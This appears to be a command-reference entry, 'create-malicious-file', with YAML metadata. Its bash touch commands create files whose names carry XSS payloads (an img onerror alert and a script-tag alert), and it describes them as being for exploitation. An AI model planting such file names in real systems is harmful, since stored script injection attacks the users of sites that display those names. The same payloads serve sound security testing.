---
data: touch '<img src=x onerror=alert(1)>.txt'
tags:
  - file-creation
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:13.969Z'
id: 2e80cc3b-8150-4161-ad1b-ed298adf8d5d
verified: false
validated: true
submitted: true
---
# create-malicious-file

## Command

```bash
touch '<img src=x onerror=alert(1)>.txt'
```

## Description

Creates an empty file with a filename containing an XSS payload for exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `'<img src=x onerror=alert(1)>.txt'` | Malicious filename | Yes |

## Examples

### Basic Usage

```bash
touch '<img src=x onerror=alert(1)>.txt'
```

### Advanced Usage

```bash
touch "<script>alert('xss')</script>.html"
```

## Expected Output

File created; verify with ls: shows the filename intact for later serving.

## Related

- [[commands/npm-install-tianma-static]]
